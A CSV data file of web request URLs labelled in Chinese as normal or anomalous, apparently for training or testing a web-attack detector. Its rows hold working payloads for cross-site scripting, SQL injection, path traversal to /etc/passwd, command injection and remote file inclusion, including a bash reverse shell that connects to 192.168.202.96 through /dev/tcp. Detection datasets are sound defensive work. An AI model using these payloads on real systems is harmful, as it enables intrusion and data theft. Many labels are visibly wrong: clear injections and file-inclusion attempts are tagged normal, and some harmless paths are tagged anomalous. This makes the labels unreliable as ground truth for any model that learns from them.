label,content
正常,/000025455/
正常,/40006660/
异常,%7Cecho$IFSIWTKTR$((97%2B63))$(echo$IFSIWTKTR)IWTKTR%22
正常,/classes/auth/openid/filestore.php?_env[asicms][path]=@rfiurl
异常,/help.php?q="ping;-w;9000;-n;1;4.3.2.1&rem;
正常,/techpartner/
正常,/javascript/intelligence.pm
正常,/paessler router traffic grapher v4/
正常,/resources/js/jquery.datatables.min.js
异常,/d5a5renl.php?<script>cross_site_scripting.nasl</script>
正常,/5243862/
正常,/index_40/
异常,/6n7aacgg.aspx?<script>cross_site_scripting.nasl</script>
正常,/flech_bar/
异常,%22echo%20COJKHQ$((57%2B48))$(echo%20COJKHQ)COJKHQ%27
异常,%7C%20%5B%203%20-ne%20%24%28echo%20MGKXID%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C
正常,/cust1left/
正常,/2020_r2/
异常,/scripts/pfdispaly.cgi?../../../../../../etc/passwd
异常,/75/75922/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
正常,/lib/classes/swift/mime/attachment.php~
异常,/javascript/realestate.exe
正常,/dod046198/
正常,/platform_mac-pc/
异常,/scgi-bin/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go
正常,/336875576nrwxpx_th/
异常,/main.php?stuff=ver\xa0>q77895939&rem\xa0
异常,"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>"
异常,%22%3Becho%20VPPMSS$((65%2B3))$(echo%20VPPMSS)VPPMSS%7C
异常,/web/BetaBlockModules/MediaFullViewModule/MediaFullViewModule.php?path_prefix=XXpathXX
正常,/cgibin/printenv.tmp
正常,/gorale papiezowi - spiewomy i gromy tobie swiety ojce/
异常,/adminpanel/includes/add_forms/addmp3.php?GLOBALS[root_path]=XXpathXX
正常,/javascript/program.as
异常,/cgi-914/fileseek.cgi?foot=;cat /etc/passwd&head=
正常,/googlcont/
正常,/hostgator/
正常,/resources/js/jquery-ui.js?_=1331918973192
异常,/main.php?logout='\x0ddel q95689814 #
异常,/phpyabs/moduli/libri/index.php?Azione=XXpathXX
异常,/examples/jsp/checkbox/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini
正常,/death machine/
异常,/quagynka.aspx?<script>cross_site_scripting.nasl</script>
正常,/examples/servlets/servlet/samba/smb2www.pl
异常,%22%3Becho$IFSBXFYAK$((0%2B86))$(echo$IFSBXFYAK)BXFYAK
正常,/wormd20min/
正常,/news1206-1/
异常,/eshow.php?Config_rootdir=XXpathXX
异常,');}print(`echo%20TFOYWK;echo%20$((13%2B51));echo%20TFOYWK;echo%20TFOYWK`)%3B%2529%257DTFOYWK
异常,/examples/jsp/jsp2/jspx/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=
正常,/653318603/
正常,/(cooking) keep the beat - heart healthy recipes/
正常,/marine_2/
异常,/60/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
正常,/javascript/polls.jsp
正常,/141026/
异常,/mod_phpalbum/sommaire_admin.php?chemin=XXpathXX?
正常,/javascript/trackback.lib
异常,/cacti/admin/plog-admin-functions.php?config[basedir]=/etc/passwd\x00
正常,/javascript/clicks.jpg
正常,/147854/
正常,/sitemap_head1/
正常,/kronolith/
正常,/main.php?stuff=|ping\x0c-w\x0c8000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c
异常,%22%7C%20%5B%207%20-ne%20%24%28echo%20GBBAUV%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20
正常,/javascript/cpadmin.log
正常,/presperspective/
正常,/examples/jsp/jsp2/el/normal_html.cgi?file=|id|
异常,/ny1b3qq4.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/modules/formmailer/formmailer.admin.inc.php?base_dir[jax_formmailer]=http://cirt.net/rfiinc.txt??
异常,/bemarket/postscript/postscript.php?p_mode=http://cirt.net/rfiinc.txt?
异常,/n9xlumt5.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/grenadiers/
异常,/viewers/txt.php?filename=../../../../../../../../../../etc/passwd\x00
异常,/recordings/forumdisplay.php?fid=21"><script>x</script>
正常,/curbing_ambulan/
异常,/ovlaunch.exe
异常,||echo$IFSCZXGHY$((46%2B9))$(echo$IFSCZXGHY)CZXGHY%26
异常,/script/gestion/index.php?path_inc=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/pmimvets/
正常,/8245dc980a838f718a78ca53f9681025ef5b9526/
异常,/patch/tools/send_reminders.php?noSet=0&includedir=XXpathXX?
正常,/take-away usb flashdisk encryption 1/
正常,/sex xxx   polskie porno -anna i marek/
正常,/minimizingtheperformancehitfromusingabe/
异常,/17335/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
正常,/communityinfo/
正常,/bp_ncom.php?bnrep=http://cirt.net/rfiinc.txt?
异常,/80/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
正常,/cross sweden/
异常,/manager/contrib/forms/evaluation/c_formevaluation.class.php?fileroot=/etc/passwd\x00
正常,/common.inc.php?cfg[libdir]=http://192.168.202.118:8080/2aibfaczmac8??
正常,/dispose/
异常,/phpmyadmin/index.php?module=<script>foo</script>
异常,%22||echo%20CMLPBA$((44%2B89))$(echo%20CMLPBA)CMLPBA%27
异常,/9ko6m4c8.cgi?<script>document.cookie="testylik=3403;"</script>
异常,/examples/jsp/sessions/awstatstotals.php?sort={${phpinfo()}}{${exit()}}
正常,/arab3upload/initialize.php?path=@rfiurl?cmd=pwd&path=@rfiurl?
异常,/psynch/nph-psf.exe?css=http://cirt.net/rfiinc.txt?
正常,/javascript/dialogs.db
正常,/help.php?q=|ping\x0b-w\x0b11000\x0b-n\x0b1\x0b4.3.2.1|rem\x0b
异常,/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=bhclbg8njf27mdlhg
正常,/cgi-915/nbmember.cgi?cmd=list_all_users
异常,%2527%3B%20str%3D%24%28echo%20DJSHTX%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F
正常,/21427585/
异常,/jobdescriptionandsalary/
正常,/scultura-0/
正常,/main.php?stuff=del\xa0q77895939&rem\xa0
正常,/phpmychat.php3?=http://192.168.202.118:8080/zz5thkvtmlgl??cmd=id
异常,%7C%20%5B%204%20-ne%20%24%28echo%20NDHYKC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C
正常,/\xe0\xaa\xaf\xe0\xab\x81\xe0\xaa\xb0\xe0\xab\x8b\xe0\xaa\xaa/
异常,<meta http-equiv=set-cookie content="testcrcv=6167">
异常,/hrttz9fj.fts?<script>document.cookie="testtbjy=7334;"</script>
异常,%3B%20str%3D%24%28echo%20POHUXH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
正常,/auzzie/
正常,/hoofnagles_cons/
正常,/th\xc3\xa8me/
正常,/business-management/
正常,/sexy young horny drunk lesbian catholic girls on home video/
异常,/bn857frh.exe?<script>cross_site_scripting.nasl</script>
正常,/img414/
正常,/buckwheat boyz - ice cream and cake/
正常,/color7 video converter christmas edition_information/
正常,/3453111/
正常,/saga mp3 cutter v1/
异常,1+and+1=1
异常,/\../\../\../\../\../\../{FILE}
正常,/programmers-phpmysql/
正常,/gold1u/
异常,/uvazfs7p.do?<meta http-equiv=set-cookie content="testwtbo=4831">
正常,/phpmyadmin.html
正常,/catalunya/
正常,/groupvoicesconcernovereucybercrime/
正常,/windows media format runtime 11_information/
异常,/d5a5renl.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/search.php?do_search=search&searchword="/><script>alert("411665577524");</script><"1&catid_search=0
正常,/spongebobsquarepantslightscamerapantsv1/
异常,%22;echo$IFSHZZDKE$((23%2B65))$(echo$IFSHZZDKE)HZZDKE&
异常,/75/75922/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
正常,/825480/
正常,/uruagesbeyondmystthepathoftheshellv1/
异常,\'-alert(1)//
异常,/?8351=%3E'%3E%22%3E%3Cscript%3Ealert(1)%3C/script%3E
正常,/email_marketing/
正常,/fonctions_racine.php?chemin_lib=http://192.168.202.96:8080/no4ghqiguzhst?
正常,/examples/jsp/sessions/printfaq.php?lng=en&pg=1
正常,/mimg-6tstkp/
正常,/admin/themes.php?config[installdir]=@rfiurl
正常,/javascript/jp.csv
正常,/w32sdbotzs/
正常,/vote200610/
正常,/fid1345603f97c4dee917bd8b0dbddf7c829410c8c9/
正常,/addsite.php?returnpath=http://192.168.202.118:8080/2aibfaczmac8?
正常,/010221/
正常,/lib/classes/swift/plugins/struts/webconsole.html
正常,/install/di.php?pathtoserverdata=@rfiurl
正常,/hioxstats.php?hm=http://cirt.net/rfiinc.txt?
异常,/theme/test4.php?root=XXpathXX
异常,/phpmyadmin/bb-hostsvc.sh?hostsvc=../../../../../etc/passwd
异常,/zcb/?page=2%20ORDER%20BY%201--%20
正常,/camper-awnings/
正常,/rand0715/
正常,/391320/
正常,/p13_water and sanitation assistant/
正常,"/top.php?stuff=&ping,-w,10000,-n,1,4.3.2.1&rem,"
正常,/common.php?db_file=http://192.168.202.118:8080/moclyxlwqyfjnp?
异常,/o1zj4u9v.fts?<script>document.cookie="testabrn=6368;"</script>
正常,/lib/classes/swift/bytestream
正常,/711539/
异常,/plugins/spamx/Import.Admin.class.php?_CONF[path]=XXpathXX
正常,/dawn of war with winter assault/
异常,/myhome/space.php?id=-4323%29%20UNION%20ALL%20SELECT%208724%23
正常,/simo2000/
正常,/191292/
正常,/erstellung-lebenslauf/
异常,/javascript/job.exe
正常,/u1586554/
正常,/171182/
异常,"""><script>alert(123)</script>"
异常,/lsoix5h3.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/shapiro20030301/
正常,/javascript/option.php
正常,/101962/
异常,/%252e%252e%252f%252e%252e%252f{FILE}
异常,/twiki/bin/view/main/twikiusers?rev=87518 `0<&152-;exec 152<>/dev/tcp/192.168.202.96/22811;sh <&152 >&152 2>&152`#
正常,/mk2000-thm/
正常,/paessler router traffic grapher v3/
正常,/holiday series limited edition ad v1/
异常,<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
正常,/msg08179/
正常,/infosecbyte/
异常,/javascript/openejb.exe
正常,/javascript/go.png
正常,/aboutent/
异常,%0A%20str%3D%24%28echo%20HHRCUR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C
正常,/sony acid pro 5/
异常,/lsoix5h3.pl?<script>cross_site_scripting.nasl</script>
正常,/javascript/showjobs.bin
正常,/1736236/
正常,/6163343/
正常,/1367790/
正常,/examples/servlets/servlet/admin/ip_manage.php
正常,/lib/classes/swift/encoder/base64encoder.php.~1~
正常,/timetablesummer/
正常,/97_3stal/
正常,/javascript/commerce.msg
异常,/..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
异常,/phpmyadmin/plugins/safehtml/htmlsax3.php?dir[plugins]=/etc/passwd\x00
正常,/ie0508/
异常,/0w155a7c.cfc?<script>cross_site_scripting.nasl</script>
异常,/www/index.php?mod=admin&con=user&act=view&id=(select%20char(106)%2bchar(58))
正常,/brunettemodelslidesupanddown12inchcock/
异常,/includes/dbal.php?eqdkp_root_path=XXpathXX
异常,/manager/main.php?g2_itemid=../../../../../license\x00
正常,/intlda/
正常,/13448_th/
正常,/gilmoreopprecon/
异常,/?408='%3E%22%3E%3C/title%3E%3C/textarea%3E%3C/script%3E%3Cimg+src=a+onerror=alert(1)%3E
正常,/lowermybills-coupons/
正常,/javascript/done
正常,/biblioteca/lin_form.php?classpath=http://cirt.net/rfiinc.txt?
正常,/videogallery/
正常,/digwyddiadau/
正常,/comix_information/
异常,%2527%3B%20str%3D%24%28echo%20EZCOIE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27
正常,/phr2005swed-ven/
正常,/acsnelmenu/
正常,/skins/phpchess/layout_cfg.php?root_path=http://192.168.202.118:8080/ghl9il?
正常,/examples/jsp/sessions/tst.bat|type c:\windows\win.ini
异常,/nph-script/
异常,/help.php?q="ping\x0b-w\x0b11000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b
异常,/examples/servlets/servlet/pjreview_neo.cgi?p=../../../../../../../../../../etc/passwd
正常,/377089/
异常,/jscripts/
异常,&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
异常,%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20HPIBFR%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%27
正常,/easypostcodes_v1/
异常,%27%7C%20%5B%202%20-ne%20%24%28echo%20UUMIWO%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526
正常,/deposit_bonus/
正常,/content/modify.php?pwfile=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,/main.php?stuff="uname >q55141299 #
异常,<body onhashchange=alert(1)><a href=#x>click this!#x
异常,"/17335/admin/receive.php?signMsg=0FEBF34C4A2EBF825F60025D6C0576F2&version=%3Cobject%20data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=%3E"
正常,/pr20020320a/
异常,/examples/jsp/colors/webplus.exe?script=webplus_install_path.nasl
异常,<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
正常,/white chicks/
异常,/eg2u8pbv.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/75/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
正常,/solomon_burke/
正常,/184556/
异常,/j2kdmfw4.do?<script>cross_site_scripting.nasl</script>
正常,/93218286/
正常,/03-audiotrack 03/
异常,/examples/jsp/error/php.cgi?/etc/passwd
正常,/pajax/pajax/pajax_call_dispatcher.php
异常,/%22/resume/?key=xxxx%bf%22;alert(360);//
正常,/retsu_watch/
正常,/schillings-sm/
异常,/main.php?logout="uname\x09#
异常,/bmeun223.jsp?<script>document.cookie="testhhwu=7044;"</script>
正常,/economialavoro/
异常,/main.php?stuff='
异常,/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+555+/tmp/ikdwpiudzb0;'); function v
正常,/denmark v england 2nd half 17th august 2005 320x240 xvid english/
正常,/sp2mempr/
正常,/fid34d2f802672feacc8aa4b501195b81f5cb56010b/
异常,%2e%2e%2f
异常,"/en-us/account/index.php?id='union/**/select/**/0,0,1431582502,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--"
异常,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>"
正常,/tippstricks/
异常,/x2gyorli.php3?<script>document.cookie="testwhac=3130;"</script>
异常, or pg_sleep(__TIME__)--
异常,/examples/jsp/cal/apa_phpinclude.inc.php?apa_module_basedir=/etc/passwd\x00
异常,/awstats/awstats.pl?migrate=|echo;/./tmp/rzemxyjqrg.sh;echo|awstats777737.txt
异常,%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20VAVICY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C
异常,/examples/jsp/error/wa.exe?debug-show-version
正常,/791530341/
正常,/index.php?site_path=http://192.168.202.118:8080/2aibfaczmac8?
异常,/vbgsitemap/vbgsitemap-vbseo.php?base=XXpathXX
异常,/xfkun1ku.exe?<script>cross_site_scripting.nasl</script>
异常,/zln2hm2z.mscgi?<meta http-equiv=set-cookie content="testblcp=8120">
异常,%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20CLRJXD%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C
正常,/sokalreplysocialtexteditorial/
正常,/480321/
正常,/guerilla/
正常,/javascript/careers.xml
异常,..\..\..\..\..\..\..\..\..\..\boot.ini
异常,/examples/servlets/servlet/lib/adodb/server.php?sql='adodb_sql_sql_injection.nasl
正常,/icon_aim/
正常,/cgi-bin/stats-bin-p/reports/index.html
异常,/sgdynamo.exe?htname=<script>foo</script>
正常,/cafeplus_v6/
正常,/javascript/homepage.fcgi
正常,/web_presence/
正常,/examples/jsp/cal/tablebean.java.html
正常,/enablemmcversion3inwindowsserver2003r2/
正常,/3964-1/
正常,/javascript/javadoc.err
正常,/javascript/hipaa.rhtml
正常,/examples/jsp/colors/setup/index.php?gallery_basedir=http://xxxxxxxx/
正常,/gmarmahabalipuram/
正常,/q33844835
异常,/phpmyadmin/_mmserverscripts/mmhttpdb.php
正常,/newvisit/
正常,/examples/jsp/jsp2/el/basic-arithmetic.jsp.copy
正常,/lordoftheringsbattleformiddleearth2v1/
正常,/shorecut/
正常,/048487/
正常,/javascript/advertise.fcgi
异常,%27||echo%20YELBOD$((58%2B80))$(echo%20YELBOD)YELBOD"
异常,%22%7C%20%5B%207%20-ne%20%24%28echo%20ADQAHN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C
正常,/ejct-05c/
正常,/147968/
正常,/examples/jsp/sessions/wiki/rankings.php
正常,/cls_fast_template.php?fname=http://192.168.202.96:8080/frznctvhi0i5?
异常,/cp2.php?securelib=XXpathXX?
正常,/phpmyadmin/index.php?do=ext&page=http://xxxxxxxx/file
正常,/modules/mysqlfinder/mysqlfinderadmin.php?_session[path_composant]=http://192.168.202.118:8080/moclyxlwqyfjnp??
正常,/codec_audio/
正常,/anna kournikova sexy picture viewer/
异常,%22%0A%20str%3D%24%28echo%20ROWALZ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27
异常,/subscriptions.exe
正常,/examples/jsp/error/index.php?mode=administration
正常,/lord of the rings complete series audiobook/
异常,/cgi-local/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
正常,/1_1789/
正常,/space haste 2/
正常,/tutorial_index/
异常,/i686v90l.html?<meta http-equiv=set-cookie content="testfutf=1550">
正常,/examples/servlets/servlet/browse.php
异常,/tukodz3j.do?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/164001/
正常,/location_manager/
正常,/christina aguilera - genie in a bottle/
正常,/forum.php?cfg_file=1&fpath=@rfiurl?cfg_file=1&fpath=@rfiurl?
异常,/main.php?stuff=&ver >q72468745&rem 
异常,echo%20ZUXLTJ$((16%2B69))$(echo%20ZUXLTJ)ZUXLTJ\
正常,/prostitutefaq/
正常,/uninstallers-r0/
正常,/171249-001px/
正常,/astericks/
正常,/baggies/
正常,/partner02/
正常,/fidc552390e9944babb85fd33758ff666bac98f6f42/
正常,/saveserver.php?thisdir=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/webasyst document depot_information/
正常,/toporderonline/
正常,/24191-1168536413/
正常,/but_ceremonies/
正常,/164682/
正常,/fide28f61d5ced44984d9aeba1932955e7d569e4cbe/
正常,/?show=http://192.168.202.118:8080/tzhfyzkbomspvm??
正常,/six feet under 503 hold my hand hdtv xvid lol/
异常,/cgi-bin/apa_phpinclude.inc.php?apa_module_basedir=/etc/passwd\x00
正常,/bee gees a history of song 1967-1990/
正常,/includes/lang/language.php?path_to_root=http://cirt.net/rfiinc.txt?
正常,/examples/jsp/num/jammail.pl?job=showoldmail&mail=|id|
异常,/main.php?logout=";sleep 8 #
异常,/top.php?stuff=\x0auname\x09>q64928545\x09#
异常,%20echo%20YPQTYX$((9%2B27))$(echo%20YPQTYX)YPQTYX&
正常,/mc convention 2003 - the best of s/
正常,/190584/
异常,/scripts/2sfdqydfaknx.asp
异常,/modif_infos.asp?n=/....../boot.ini
异常,/scripts/changelog
正常,/doc-10218663/
异常,/javascript/cron.exe
异常,/en-us/odzk29aa.idc?<meta http-equiv=set-cookie content="testtfvh=2141">
正常,/casino-2/
异常,/chat/users_popupL.php3?From=XXpathXX
正常,/slopez/
正常,/insidedigitalmedia/
正常,/infosys/
异常,/3m5knyc4.cfc?<script>document.cookie="testbgqj=6434;"</script>
异常,/6dlc2zm9.nsf?<meta http-equiv=set-cookie content="testqpux=4016">
正常,/content/modify_go.php?pwfile=http://192.168.202.96:8080/no4ghqiguzhst?
异常,/examples/jsp/checkbox/perl.exe?-v
异常,%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f
正常,/tirocinio/
正常,/candlemass - live with bonus track the bells of acheron/
